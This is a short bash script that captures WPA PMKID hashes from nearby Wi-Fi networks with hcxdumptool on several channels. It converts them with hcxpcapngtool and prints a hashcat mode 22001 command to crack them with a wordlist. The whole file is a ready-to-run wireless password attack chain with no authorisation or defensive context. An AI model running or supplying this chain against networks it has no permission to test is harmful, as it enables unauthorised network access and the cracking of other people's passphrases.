#!/bin/bash
# Enterprise PMKID capture
IFACE="${1:-wlan0mon}"
OUT="pmkid-$(date +%Y%m%d).pcapng"

hcxdumptool -i "$IFACE" -o "$OUT" --enable_status=1 -c 1,6,11,36,40,44,48
echo "[+] PMKID capture saved to $OUT"

# Convert for hashcat
hcxpcapngtool -o pmkid.hash "$OUT"
echo "[+] Hashcat format: pmkid.hash"
echo "[*] Crack: hashcat -m 22001 pmkid.hash wordlist.txt"
